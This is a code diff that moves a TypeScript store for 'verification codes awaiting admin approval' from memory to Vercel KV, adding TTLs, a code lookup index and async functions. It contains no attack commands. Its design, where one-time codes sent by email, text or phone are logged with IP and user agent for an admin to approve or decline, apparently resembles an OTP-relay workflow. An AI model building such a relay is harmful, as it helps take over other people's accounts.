@@ -1,7 +1,10 @@
 /**
  * Pending Codes Storage System
  * Tracks verification codes awaiting admin approval
+ * Uses Vercel KV for persistent storage across serverless instances
  */
+
+import { kv } from "@vercel/kv";
 
 export interface PendingCode {
   id: string;
@@ -21,14 +24,15 @@ export interface PendingCode {
   userAgent?: string;
 }
 
-// In-memory storage (in production, use a database)
-const pendingCodesMap = new Map<string, PendingCode>();
-
 // Cleanup interval (5 minutes)
 const CLEANUP_INTERVAL = 5 * 60 * 1000;
 
 // Code expiry (15 minutes by default)
 const CODE_EXPIRY = 15 * 60 * 1000;
+
+// KV key prefixes
+const PENDING_CODE_KEY = "pending:";
+const CODE_TO_ID_KEY = "code2id:";
 
 /**
  * Generate a unique ID for a code
@@ -40,7 +44,7 @@ export function generateCodeId(): string {
 /**
  * Store a pending code
  */
-export function storePendingCode(
+export async function storePendingCode(
   code: string,
   method: "email" | "text" | "phone",
   otpStep: 1 | 2,
@@ -49,7 +53,7 @@ export function storePendingCode(
     clientIp?: string;
     userAgent?: string;
   },
-): PendingCode {
+): Promise<PendingCode> {
   const id = generateCodeId();
   const now = Date.now();
 
@@ -66,7 +70,27 @@ export function storePendingCode(
     userAgent: options?.userAgent,
   };
 
-  pendingCodesMap.set(id, pendingCode);
+  // Store with expiry (convert ms to seconds for KV TTL)
+  const ttlSeconds = Math.ceil((pendingCode.expiresAt - now) / 1000);
+  
+  await kv.setex(
+    `${PENDING_CODE_KEY}${id}`,
+    ttlSeconds,
+    JSON.stringify(pendingCode)
+  );
+
+  // Also store mapping from code value to ID (with same TTL)
+  await kv.setex(
+    `${CODE_TO_ID_KEY}${code}`,
+    ttlSeconds,
+    id
+  );
+
+  // Add to set of all pending code IDs
+  await kv.sadd("pending:ids", id);
+  
+  // Extend TTL of the set
+  await kv.expire("pending:ids", ttlSeconds);
 
   return pendingCode;
 }
@@ -74,9 +98,11 @@ export function storePendingCode(
 /**
  * Get a pending code by ID
  */
-export function getPendingCode(id: string): PendingCode | undefined {
-  const code = pendingCodesMap.get(id);
-  if (!code) return undefined;
+export async function getPendingCode(id: string): Promise<PendingCode | undefined> {
+  const data = await kv.get(`${PENDING_CODE_KEY}${id}`);
+  if (!data) return undefined;
+
+  const code = JSON.parse(data as string) as PendingCode;
 
   // Check if expired
   if (code.expiresAt < Date.now()) {
@@ -90,31 +116,35 @@ export function getPendingCode(id: string): PendingCode | undefined {
 /**
  * Get a pending code by code value
  */
-export function getPendingCodeByValue(code: string): PendingCode | undefined {
-  for (const pending of pendingCodesMap.values()) {
-    if (pending.code === code && pending.status === "pending") {
-      if (pending.expiresAt < Date.now()) {
-        pending.status = "expired";
-        continue;
-      }
-      return pending;
-    }
-  }
-  return undefined;
+export async function getPendingCodeByValue(code: string): Promise<PendingCode | undefined> {
+  const id = await kv.get(`${CODE_TO_ID_KEY}${code}`);
+  if (!id) return undefined;
+
+  return getPendingCode(id as string);
 }
 
 /**
  * Update a pending code status
  */
-export function updatePendingCode(
+export async function updatePendingCode(
   id: string,
   update: Partial<PendingCode>,
-): PendingCode | undefined {
-  const code = pendingCodesMap.get(id);
+): Promise<PendingCode | undefined> {
+  const code = await getPendingCode(id);
   if (!code) return undefined;
 
   const updated = { ...code, ...update };
-  pendingCodesMap.set(id, updated);
+  
+  // Calculate remaining TTL
+  const now = Date.now();
+  const remainingMs = Math.max(updated.expiresAt - now, 1000); // At least 1 second
+  const ttlSeconds = Math.ceil(remainingMs / 1000);
+  
+  await kv.setex(
+    `${PENDING_CODE_KEY}${id}`,
+    ttlSeconds,
+    JSON.stringify(updated)
+  );
 
   return updated;
 }
@@ -122,10 +152,10 @@ export function updatePendingCode(
 /**
  * Approve a code
  */
-export function approvePendingCode(
+export async function approvePendingCode(
   id: string,
   approvedBy: string,
-): PendingCode | undefined {
+): Promise<PendingCode | undefined> {
   return updatePendingCode(id, {
     status: "approved",
     approvedBy,
@@ -136,10 +166,10 @@ export function approvePendingCode(
 /**
  * Decline a code
  */
-export function declinePendingCode(
+export async function declinePendingCode(
   id: string,
   declinedBy: string,
-): PendingCode | undefined {
+): Promise<PendingCode | undefined> {
   return updatePendingCode(id, {
     status: "declined",
     declinedBy,
@@ -150,16 +180,31 @@ export function declinePendingCode(
 /**
  * Get all pending codes
  */
-export function getAllPendingCodes(): PendingCode[] {
-  return Array.from(pendingCodesMap.values());
+export async function getAllPendingCodes(): Promise<PendingCode[]> {
+  // Get all code IDs from the set
+  const ids = await kv.smembers("pending:ids");
+  if (!ids || ids.length === 0) return [];
+
+  const codes: PendingCode[] = [];
+  
+  for (const id of ids) {
+    const code = await getPendingCode(id as string);
+    if (code) {
+      codes.push(code);
+    }
+  }
+
+  return codes;
 }
 
 /**
  * Get active pending codes (not expired, not processed)
  */
-export function getActivePendingCodes(): PendingCode[] {
+export async function getActivePendingCodes(): Promise<PendingCode[]> {
   const now = Date.now();
-  return Array.from(pendingCodesMap.values()).filter(
+  const all = await getAllPendingCodes();
+  
+  return all.filter(
     (code) =>
       code.status === "pending" && code.expiresAt >= now,
   );
@@ -168,13 +213,17 @@ export function getActivePendingCodes(): PendingCode[] {
 /**
  * Clean up expired codes
  */
-export function cleanupExpiredCodes(): number {
+export async function cleanupExpiredCodes(): Promise<number> {
   let count = 0;
   const now = Date.now();
+  const ids = await kv.smembers("pending:ids");
 
-  for (const [id, code] of pendingCodesMap.entries()) {
-    if (code.expiresAt < now && code.status === "pending") {
-      code.status = "expired";
+  if (!ids || ids.length === 0) return 0;
+
+  for (const id of ids) {
+    const code = await getPendingCode(id as string);
+    if (code && code.expiresAt < now && code.status === "pending") {
+      await updatePendingCode(id as string, { status: "expired" });
       count++;
     }
   }
@@ -186,8 +235,8 @@ export function cleanupExpiredCodes(): number {
  * Start automatic cleanup
  */
 export function startAutocleanup(): void {
-  setInterval(() => {
-    const count = cleanupExpiredCodes();
+  setInterval(async () => {
+    const count = await cleanupExpiredCodes();
     if (count > 0) {
       console.log(`[Pending Codes] Cleaned up ${count} expired codes`);
     }
@@ -197,9 +246,9 @@ export function startAutocleanup(): void {
 /**
  * Get statistics
  */
-export function getPendingCodesStats() {
-  const all = getAllPendingCodes();
-  const pending = getActivePendingCodes();
+export async function getPendingCodesStats() {
+  const all = await getAllPendingCodes();
+  const pending = await getActivePendingCodes();
 
   return {
     total: all.length,
